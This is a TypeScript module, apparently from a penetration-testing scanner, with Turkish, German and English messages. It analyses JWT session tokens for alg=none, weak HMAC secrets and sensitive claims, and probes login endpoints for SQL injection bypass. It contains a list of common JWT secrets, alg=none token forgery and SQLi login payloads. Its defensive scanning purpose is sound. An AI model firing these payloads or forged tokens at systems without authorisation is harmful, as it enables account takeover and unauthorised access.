/**
 * (İŞ 3) EK KİMLİK-DOĞRULAMA KONTROLLERİ — JWT/token güvenliği + Giriş baypası (SQLi göstergesi).
 *
 * İLKE: "kanıtla, ASLA istismar etme". Analizin çoğu OFFLINE (token'ı çözer, imzayı yaygın sırlarla
 * doğrular, claim'lere bakar). Aktif kısımlar TEK, zararsız GÖZLEMdir (forged token kabul ediliyor mu;
 * login baypas göstergesi var mı) — gerçek oturum ele geçirme/istismar YOK, retry YOK, circuit breaker
 * ve prob-üst-sınırı AYNEN geçerli. Bulunamazsa DÜRÜSTÇE "gösterge yok".
 */
import crypto from 'node:crypto';
import { cachedOriginUrl } from './surfaceEvidence.js';
import { ProbeCtx, type ActiveCheckEvidence, type VFinding } from './activeVerifyEvidence.js';
import { type AuthSession, applyAuthHeaders } from './authSession.js';

function b64urlDecode(s: string): string {
  return Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
}
function b64urlEncode(buf: Buffer): string {
  return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

// Yaygın/zayıf JWT HMAC sırları (OFFLINE deneme — sadece imza doğrulaması; ağ yok).
const COMMON_JWT_SECRETS = [
  'secret', 'password', 'changeme', 'jwt', 'token', 'key', 'private', 'admin', 'test', 'dev',
  '123456', 'secretkey', 'jwtsecret', 'supersecret', 'my-secret', 'your-256-bit-secret', 'cybertestify',
];
const HMAC_ALGS: Record<string, string> = { hs256: 'sha256', hs384: 'sha384', hs512: 'sha512' };
const SENSITIVE_CLAIM_RE = /^(password|pass|pwd|secret|api[_-]?key|private[_-]?key)$/i;
const PRIVILEGE_CLAIM_RE = /^(role|roles|isadmin|is[_-]?admin|admin|scope|scopes|permissions?|perms?|group|grade|access[_-]?level)$/i;

const empty = (notes: string[]): ActiveCheckEvidence => ({ ok: true, pagesScanned: 0, inputsFound: 0, probesSent: 0, findings: [], stopped: null, notes });

/**
 * JWT / token güvenlik analizi (full_pentest). Oturum bir JWT bearer taşıyorsa: alg=none, zayıf/bilinen
 * HMAC sırrı (OFFLINE), hassas/aşırı claim; + TEK guarded "alg=none kabul ediliyor mu" gözlemi.
 */
export async function collectJwtAnalysis(host: string, session: AuthSession, locale: string = 'tr'): Promise<ActiveCheckEvidence> {
  const de = locale === 'de', en = locale === 'en';
  const t = (trS: string, deS: string, enS?: string) => (de ? deS : en ? (enS ?? trS) : trS);
  const token = session.bearer?.trim();
  if (!token || token.split('.').length !== 3) {
    return empty([t('Oturum bir JWT (üç parçalı token) taşımıyor — JWT/token analizi bu hedef için uygulanabilir değil.', 'Die Sitzung trägt kein JWT (dreiteiliges Token) — die JWT/Token-Analyse ist für dieses Ziel nicht anwendbar.', 'The session does not carry a JWT (three-part token) — JWT/token analysis is not applicable to this target.')]);
  }
  const [h, p, sig] = token.split('.');
  let header: any, payload: any;
  try { header = JSON.parse(b64urlDecode(h)); payload = JSON.parse(b64urlDecode(p)); } catch {
    return empty([t('Oturum token’ı JWT gibi görünse de çözümlenemedi — analiz yapılamadı.', 'Das Sitzungs-Token sah zwar wie ein JWT aus, konnte aber nicht dekodiert werden — es konnte keine Analyse durchgeführt werden.', 'Although the session token looked like a JWT, it could not be decoded — no analysis could be performed.')]);
  }
  const alg = String(header?.alg ?? '').toLowerCase();
  const findings: VFinding[] = [];
  const notes: string[] = [];

  // 1) alg=none (token zaten imzasız).
  if (alg === 'none' || !sig) {
    findings.push({ check: 'jwt', inputPoint: 'Authorization Bearer (JWT)', vulnerable: true, technique: t('alg=none / imzasız token', 'alg=none / unsigniertes Token', 'alg=none / unsigned token'),
      evidence: t('Oturum token’ı imzasız (alg=none) görünüyor — sunucu imzayı doğrulamıyorsa token içeriği (yetki/rol) istemci tarafında değiştirilebilir.', 'Das Sitzungs-Token erscheint unsigniert (alg=none) — wenn der Server die Signatur nicht validiert, kann der Token-Inhalt (Berechtigung/Rolle) clientseitig verändert werden.', 'The session token appears unsigned (alg=none) — if the server does not validate the signature, the token content (privilege/role) can be modified client-side.'), confidence: 'medium', severity: 'high', sideEffectRisk: 'none' });
  }

  // 2) Zayıf/bilinen HMAC sırrı (OFFLINE): HS* ise imzayı yaygın sırlarla yeniden hesapla, eşleşirse KRİTİK.
  if (HMAC_ALGS[alg]) {
    const data = `${h}.${p}`;
    for (const secret of COMMON_JWT_SECRETS) {
      const expected = b64urlEncode(crypto.createHmac(HMAC_ALGS[alg], secret).update(data).digest());
      if (crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(sig)) === false) continue;
      findings.push({ check: 'jwt', inputPoint: 'Authorization Bearer (JWT)', vulnerable: true, technique: t(`zayıf/bilinen HMAC sırrı ("${secret}")`, `schwaches/bekanntes HMAC-Geheimnis ("${secret}")`, `weak/known HMAC secret ("${secret}")`),
        evidence: t(`Token imzası YAYGIN/zayıf bir sır ("${secret}") ile doğrulandı — saldırgan kendi geçerli token’ını üretip yetki yükseltebilir (kritik). İmza sırrı güçlü/rastgele bir değerle değiştirilmeli.`, `Die Token-Signatur wurde mit einem VERBREITETEN/schwachen Geheimnis ("${secret}") validiert — ein Angreifer kann ein eigenes gültiges Token erzeugen und seine Berechtigung ausweiten (kritisch). Das Signatur-Geheimnis sollte durch einen starken/zufälligen Wert ersetzt werden.`, `The token signature was validated with a COMMON/weak secret ("${secret}") — an attacker can produce their own valid token and escalate privilege (critical). The signing secret should be replaced with a strong/random value.`), confidence: 'high', severity: 'high', sideEffectRisk: 'none' });
      break;
    }
  }

  // 3) Hassas / aşırı claim (OFFLINE gözlem — DEĞERLER gösterilmez).
  const claimKeys = payload && typeof payload === 'object' ? Object.keys(payload) : [];
  const secretClaims = claimKeys.filter((k) => SENSITIVE_CLAIM_RE.test(k));
  const privClaims = claimKeys.filter((k) => PRIVILEGE_CLAIM_RE.test(k));
  if (secretClaims.length) {
    findings.push({ check: 'jwt', inputPoint: 'Authorization Bearer (JWT)', vulnerable: true, technique: t(`token içinde hassas claim (${secretClaims.join(', ')})`, `sensibler Claim im Token (${secretClaims.join(', ')})`, `sensitive claim inside token (${secretClaims.join(', ')})`),
      evidence: t(`Token gövdesinde parola/sır türü claim(ler) taşınıyor: \`${secretClaims.join('`, `')}\`. JWT gövdesi imzalıdır ama ŞİFRELİ DEĞİLDİR — Base64 ile herkes okuyabilir. Bu tür veriler token’a konmamalı. (Değerler raporda gösterilmez.)`, `Im Token-Body werden Claim(s) vom Typ Passwort/Geheimnis getragen: \`${secretClaims.join('`, `')}\`. Der JWT-Body ist signiert, aber NICHT VERSCHLÜSSELT — per Base64 für jeden lesbar. Solche Daten sollten nicht in das Token aufgenommen werden. (Die Werte werden im Bericht nicht angezeigt.)`, `The token body carries password/secret-type claim(s): \`${secretClaims.join('`, `')}\`. The JWT body is signed but NOT ENCRYPTED — anyone can read it via Base64. Such data should not be placed in the token. (The values are not shown in the report.)`), confidence: 'high', severity: 'medium', sideEffectRisk: 'none' });
  }
  if (privClaims.length) notes.push(t(`Token, yetki/rol türü claim(ler) içeriyor: ${privClaims.join(', ')} (bilgilendirme; değerler gösterilmez). Bu claim’ler sunucuda doğrulanmalı, istemciden gelen değere güvenilmemelidir.`, `Das Token enthält Claim(s) vom Typ Berechtigung/Rolle: ${privClaims.join(', ')} (zur Information; die Werte werden nicht angezeigt). Diese Claims müssen serverseitig validiert werden, dem clientseitigen Wert darf nicht vertraut werden.`, `The token contains privilege/role-type claim(s): ${privClaims.join(', ')} (informational; values not shown). These claims must be validated server-side; the client-supplied value must not be trusted.`));
  if (payload && typeof payload === 'object' && !('exp' in payload)) notes.push(t('Token’da son kullanma (exp) claim’i yok — süresiz token, çalınması durumunda kalıcı erişim riski taşır.', 'Im Token gibt es keinen Ablauf-Claim (exp) — ein Token ohne Ablauf birgt im Falle eines Diebstahls das Risiko dauerhaften Zugriffs.', 'The token has no expiry (exp) claim — a non-expiring token carries the risk of permanent access if stolen.'));

  // 4) (Guarded aktif) "alg=none kabul ediliyor mu" GÖZLEMİ: aynı payload ile imzasız token forge et,
  //    ÖNCE gerçek token'la 200 dönen bir korumalı okuma ucu bul, SONRA forged token'la aynı ucu dene.
  //    200 ise sunucu imzasız token'ı kabul ediyor (kritik). Yalnız GÖZLEM — erişim KULLANILMAZ.
  const forged = `${b64urlEncode(Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })))}.${p}.`;
  const CANDIDATES = ['/rest/user/whoami', '/api/users/me', '/api/user/me', '/api/me', '/me', '/user/profile', '/rest/user/me'];
  const real = new ProbeCtx(); real.locale = locale; real.authHeaders = applyAuthHeaders({}, session);
  let probedAny = false;
  for (const path of CANDIDATES) {
    if (real.stopped) break;
    const url = `${cachedOriginUrl(host)}${path}`;
    const okReal = await real.fetchOnce(url); // gerçek token ile korumalı uç mu?
    if (!okReal || okReal.status !== 200 || /<html|<!doctype|login|sign in/i.test(okReal.text.slice(0, 400))) continue;
    probedAny = true;
    const forgedCtx = new ProbeCtx(); forgedCtx.locale = locale; forgedCtx.authHeaders = { Authorization: `Bearer ${forged}` };
    const forgedRes = await forgedCtx.fetchOnce(url); // imzasız token ile aynı uç
    if (forgedRes && forgedRes.status === 200 && !/unauthor|invalid|expired|<html|<!doctype|login/i.test(forgedRes.text.slice(0, 400))) {
      findings.push({ check: 'jwt', inputPoint: `Authorization Bearer (alg=none) @ ${path}`, vulnerable: true, technique: t('alg=none forged token KABUL edildi', 'alg=none gefälschtes Token AKZEPTIERT', 'alg=none forged token ACCEPTED'),
        evidence: t(`İmzasız (alg=none) forge edilmiş bir token, korumalı bir uçta (${path}) HTTP 200 ile kabul edildi — sunucu JWT imzasını doğrulamıyor (kritik). Gözlem amaçlıdır; erişim kullanılmadı.`, `Ein unsigniertes (alg=none) gefälschtes Token wurde an einem geschützten Endpunkt (${path}) mit HTTP 200 akzeptiert — der Server validiert die JWT-Signatur nicht (kritisch). Dies dient nur der Beobachtung; der Zugriff wurde nicht genutzt.`, `An unsigned (alg=none) forged token was accepted at a protected endpoint (${path}) with HTTP 200 — the server does not validate the JWT signature (critical). This is for observation only; the access was not used.`), confidence: 'high', severity: 'high', sideEffectRisk: 'none' });
    }
    break; // tek korumalı uç yeterli
  }
  if (!probedAny) notes.push(t('alg=none kabul gözlemi için doğrulanabilir bir korumalı okuma ucu (whoami/profil) bulunamadı — bu gözlem atlandı.', 'Für die Beobachtung der alg=none-Akzeptanz wurde kein verifizierbarer geschützter Lese-Endpunkt (whoami/Profil) gefunden — diese Beobachtung wurde übersprungen.', 'No verifiable protected read endpoint (whoami/profile) was found for the alg=none acceptance observation — this observation was skipped.'));

  if (!findings.length) notes.push(t('JWT/token güvenlik göstergesi bulunamadı (alg=none değil, zayıf sır doğrulanmadı, hassas claim yok).', 'Es wurde kein JWT/Token-Sicherheitsindikator gefunden (kein alg=none, kein schwaches Geheimnis bestätigt, kein sensibler Claim).', 'No JWT/token security indicator was found (not alg=none, no weak secret confirmed, no sensitive claim).'));
  const probes = real.sent;
  return { ok: true, pagesScanned: 0, inputsFound: 1, probesSent: probes, findings, stopped: real.stopped, notes };
}

// ---- Giriş baypası (SQLi göstergesi) ----------------------------------------------------
// (Form-POST agresiflik) giriş baypası payload çeşitliliği artırıldı — hepsi salt kimlik-doğrulama
// atlatma göstergesi arar; oturum ele geçirilmez/kullanılmaz. Kayıt oluşturmaz (login ucu).
const SQLI_LOGIN_PAYLOADS = [`' OR '1'='1`, `' OR 1=1--`, `admin'--`, `' OR '1'='1'-- -`, `") OR ("1"="1`, `' OR 'a'='a`, `admin' #`];
// (Soru 2 düzeltmesi) POZİTİF başarı göstergesi ZORUNLU: yalnız "2xx + hata-metni-yok" YETMEZ (var-olmayan
// uçta/genel 200 fallback'te yanlış-pozitif üretirdi). Auth token, "logged in/oturum açıldı/welcome" veya
// success:true gibi AÇIK bir başarı sinyali aranır (AltoroMutual /api/login gerçek bypass'ında da bunlar var).
const POSITIVE_AUTH_RE = /"(token|authentication|authorization|jwt|access_?token|accessToken|bearer|sessionId|session_id)"\s*:\s*"?[^"\s,}]{6,}|logged\s?in|login successful|giriş başarılı|oturum aç[ıi]ld|welcome\b|hoş\s?geldin|"success"\s*:\s*(?:true|"(?!false))/i;
const TOKEN_INDICATOR_RE = /"(token|authentication|authorization|jwt|access_token|accessToken|bearer)"\s*:/i;
const LOGIN_FAIL_RE = /(invalid|hatal|geçersiz|unauthor|yanlış|incorrect|denied|reddedil|not found in our system|401|403)/i;

/**
 * Login formuna baypas SQLi GÖSTERGESİ (full_pentest + active_verify). Login POST'u zaten izinlidir.
 * ÖNCE kontrol (uydurma kimlik) → başarısız beklenir; SONRA SQLi payload → başarı/token dönerse GÖSTERGE.
 * Gerçek oturum ele geçirme/istismar YOK; yalnız "kimlik atlatma göstergesi var mı" gözlemi.
 */
export async function collectLoginBypassEvidence(host: string, loginUrl?: string, locale: string = 'tr'): Promise<ActiveCheckEvidence> {
  const de = locale === 'de', en = locale === 'en';
  const t = (trS: string, deS: string, enS?: string) => (de ? deS : en ? (enS ?? trS) : trS);
  // Login ucu: bilinen (full_pentest authLogin) VEYA yaygın adaylar.
  const candidates: string[] = [];
  if (loginUrl) candidates.push(loginUrl);
  for (const p of ['/rest/user/login', '/api/login', '/api/auth/login', '/api/users/login', '/login', '/auth/login']) {
    const u = `${cachedOriginUrl(host)}${p}`;
    if (!candidates.includes(u)) candidates.push(u);
  }

  const ctx = new ProbeCtx(); ctx.locale = locale;
  const findings: VFinding[] = [];
  const notes: string[] = [];
  const rnd = crypto.randomBytes(6).toString('hex');
  const bodyOf = (id: string, pw: string) => JSON.stringify({ email: id, username: id, password: pw });
  // POZİTİF başarı sinyali ŞART (yalnız 2xx değil) — yanlış-pozitife karşı.
  const isSuccess = (r: { status: number; text: string } | null) =>
    !!r && r.status >= 200 && r.status < 300 && POSITIVE_AUTH_RE.test(r.text) && !LOGIN_FAIL_RE.test(r.text.slice(0, 400));
  // Kanıt için güvenli özet: token/authorization DEĞERLERİNİ redakte et, başarı ibaresini göster.
  const safeSnippet = (text: string) => text
    .replace(/("(?:token|authorization|authentication|jwt|access_?token|accessToken|bearer|sessionId|session_id)"\s*:\s*")[^"]+"/gi, '$1***"')
    .replace(/\s+/g, ' ').trim().slice(0, 140);

  let testedEndpoint: string | null = null;
  let testedCount = 0;
  for (const url of candidates) {
    if (ctx.stopped) break;
    if (testedCount >= 4) break; // en fazla 4 GERÇEK login ucu test et (devre kesiciyi koru)
    // (a) Kontrol: kesinlikle geçersiz kimlik -> başarısız olmalı (uç gerçekten login mi + baseline).
    const control = await ctx.fetchOnce(url, { method: 'POST', body: bodyOf(`nouser+${rnd}@example.com`, `wrong-${rnd}`), contentType: 'application/json' });
    if (!control || control.status === 404 || control.status === 0) continue; // bu uç login değil
    testedEndpoint = url;
    testedCount++;
    if (isSuccess(control)) { notes.push(t(`\`${new URL(url).pathname}\` uydurma kimlikle de başarı döndürdü — güvenilir baypas ölçümü yapılamadı (bu uç atlandı).`, `\`${new URL(url).pathname}\` gab auch mit erfundenen Anmeldedaten einen Erfolg zurück — eine zuverlässige Umgehungsmessung war nicht möglich (dieser Endpunkt wurde übersprungen).`, `\`${new URL(url).pathname}\` also returned success with fabricated credentials — a reliable bypass measurement was not possible (this endpoint was skipped).`)); continue; }
    // (b) SQLi payload'ları — biri kontrolün AKSİNE POZİTİF başarı sinyali (token/"logged in") dönerse GÖSTERGE.
    for (const payload of SQLI_LOGIN_PAYLOADS) {
      if (ctx.stopped) break;
      const r = await ctx.fetchOnce(url, { method: 'POST', body: bodyOf(payload, `x-${rnd}`), contentType: 'application/json' });
      if (isSuccess(r) && r) {
        const strongToken = TOKEN_INDICATOR_RE.test(r.text) || /"authorization"\s*:/i.test(r.text);
        findings.push({ check: 'login_bypass', inputPoint: `POST ${new URL(url).pathname}`, vulnerable: true, technique: t(`giriş baypası (SQLi: \`${payload}\`)`, `Login-Umgehung (SQLi: \`${payload}\`)`, `login bypass (SQLi: \`${payload}\`)`),
          evidence: t(`Kontrol (geçersiz kimlik) → HTTP ${control.status} (başarısız). SQLi payload \`${payload}\` → HTTP ${r.status} + AÇIK başarı sinyali: "${safeSnippet(r.text)}". Kimlik doğrulama SQL enjeksiyonuyla ATLATILIYOR${strongToken ? ' (oturum/authorization token döndü — güçlü kanıt)' : ''}. Oturum ele geçirme/istismar YAPILMADI; token değeri raporda gösterilmez (redakte).`, `Kontrolle (ungültige Anmeldedaten) → HTTP ${control.status} (fehlgeschlagen). SQLi-Payload \`${payload}\` → HTTP ${r.status} + EINDEUTIGES Erfolgssignal: "${safeSnippet(r.text)}". Die Authentifizierung wird per SQL-Injection UMGANGEN${strongToken ? ' (Sitzungs-/Authorization-Token wurde zurückgegeben — starker Nachweis)' : ''}. Es wurde keine Sitzungsübernahme/Ausnutzung durchgeführt; der Token-Wert wird im Bericht nicht angezeigt (redigiert).`, `Control (invalid credentials) → HTTP ${control.status} (failed). SQLi payload \`${payload}\` → HTTP ${r.status} + CLEAR success signal: "${safeSnippet(r.text)}". Authentication is BEING BYPASSED via SQL injection${strongToken ? ' (a session/authorization token was returned — strong evidence)' : ''}. No session takeover/exploitation was performed; the token value is not shown in the report (redacted).`),
          confidence: strongToken ? 'high' : 'medium', severity: 'high', sideEffectRisk: 'none' });
        break;
      }
    }
    if (findings.length) break; // baypas bulundu -> yeter. Aksi halde diğer adayları da dene (ör. form
    // ucu /login.jsp bypass etmese de gerçek injectable /api/login sonraki adaydadır — erken durma).
  }

  if (!testedEndpoint) notes.push(t('Test edilebilir bir giriş (login) ucu bulunamadı — giriş baypası göstergesi kontrolü uygulanamadı.', 'Es wurde kein testbarer Login-Endpunkt gefunden — die Prüfung auf einen Login-Umgehungs-Indikator konnte nicht durchgeführt werden.', 'No testable login endpoint was found — the login-bypass indicator check could not be performed.'));
  else if (!findings.length) notes.push(t('Giriş baypası (SQLi) göstergesi bulunamadı — SQLi payload’ları geçersiz kimlik denemesinden farklı bir sonuç üretmedi.', 'Es wurde kein Login-Umgehungs-Indikator (SQLi) gefunden — die SQLi-Payloads erzeugten kein anderes Ergebnis als ein ungültiger Anmeldeversuch.', 'No login-bypass (SQLi) indicator was found — the SQLi payloads produced no different result from an invalid credential attempt.'));
  return { ok: true, pagesScanned: 0, inputsFound: testedEndpoint ? 1 : 0, probesSent: ctx.sent, findings, stopped: ctx.stopped, notes };
}
